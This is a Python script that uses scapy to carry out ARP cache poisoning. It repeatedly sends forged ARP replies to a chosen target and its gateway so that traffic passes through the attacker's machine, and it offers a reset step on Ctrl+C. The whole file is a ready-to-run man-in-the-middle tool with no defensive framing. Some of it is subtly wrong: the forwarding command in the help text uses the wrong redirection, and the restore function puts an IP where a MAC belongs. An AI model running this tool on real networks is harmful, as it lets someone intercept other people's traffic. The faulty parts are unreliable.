#!/usr/bin/env python

import sys
import time
import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target", dest="target",help="Target IP address. Do 'arp -a' and 'route PRINT' on target PC. Port forward by doing 'echo 1 < /proc/sys/net/ipv4/ip_forward'")
    parser.add_option("-g","--gateway", dest="gateway",help="Gateway IP address.(Router) Do 'arp -a' and 'route PRINT' on target PC. Port forward by doing 'echo 1 < /proc/sys/net/ipv4/ip_forward'")
    
    (options,arguments) = parser.parse_args()
    if not options.target:
        parser.error("\n[-] Please provide target IP address.\n")
    elif not options.gateway:
        parser.error("\nPlease Router gateway IP address.\n")
    return options


def get_mac(ip):    
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
    return answered_list[0][1].hwsrc #return mac address of the router. 0th index is the router. 1st index is the mac inside the element.
    # clients_list =[]
    # for element in answered_list:
    #     clients_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
    #     clients_list.append(clients_dict)
    # return clients_list

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)
    
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=source_ip, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    

target_ip = get_arguments().target
gateway_ip = get_arguments().gateway

try:
    sent_packets_count = 0
    while True:    
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: "+str(sent_packets_count)),
        sys.stdout.flush()    
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting ARP tables.. \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)